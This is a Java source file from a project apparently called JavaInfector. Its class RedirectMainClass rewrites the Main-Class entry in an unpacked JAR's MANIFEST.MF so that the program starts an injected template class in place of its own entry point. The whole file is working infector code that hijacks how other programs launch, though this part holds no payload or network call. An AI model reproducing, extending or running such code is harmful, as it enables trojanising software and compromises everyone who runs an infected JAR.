package jlxip.JavaInfector;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.regex.Pattern;

public class RedirectMainClass {
	String INTERNAL_NEW_MC = "";
	Pattern dot_pattern = Pattern.compile(Pattern.quote("."));
	
	public String getFullPath(String DESTDIR, String InternalName) {
		String FULLPATH = DESTDIR;
		String[] levels = dot_pattern.split(InternalName);
		for(int i=0;i<levels.length;i++) {
			if(i == levels.length-1) {
				FULLPATH = FULLPATH + "." + levels[i];
			} else {
				FULLPATH = FULLPATH + File.separator + levels[i];
			}
		}
		return FULLPATH;
	}
	
	public File run(String DESTDIR, File TEMPLATE) {
		System.out.print("Redirecting main class...");
		
		String NewMain = TEMPLATE.getName();
		String MC = "";
		File FMANIFEST = new File(DESTDIR + File.separator + "META-INF" + File.separator + "MANIFEST.MF");
		try{
			FileReader FRMANIFEST = new FileReader(FMANIFEST);
			BufferedReader BRMANIFEST = new BufferedReader(FRMANIFEST);
			
			String lastLine;
			ArrayList<String> lines = new ArrayList<String>();
			while((lastLine = BRMANIFEST.readLine()) != null) {
				Pattern MainClass_pattern = Pattern.compile(Pattern.quote("Main-Class: "));
				String[] mains = MainClass_pattern.split(" "+lastLine);
				if(mains.length > 1) {
					String ModifiedLine = "Main-Class: "+dot_pattern.split(NewMain)[0];
					lines.add(ModifiedLine);
				} else {
					lines.add(lastLine);
				}
			}
			
			BRMANIFEST.close();
			FRMANIFEST.close();
			
			FMANIFEST.delete();
			
			FileWriter FWMANIFEST = new FileWriter(FMANIFEST);
			PrintWriter PWMANIFEST = new PrintWriter(FWMANIFEST);
			
			for(int i=0;i<lines.size();i++) {
				PWMANIFEST.println(lines.get(i));
			}
			
			PWMANIFEST.close();
			FWMANIFEST.close();
			System.out.println("Done!");
		} catch(IOException e) {
			System.out.println("FAILED!");
			e.printStackTrace();
		}
		
		return new File(getFullPath(DESTDIR, NewMain));
	}
	
	public String getNewMC() {
		return INTERNAL_NEW_MC;
	}
}
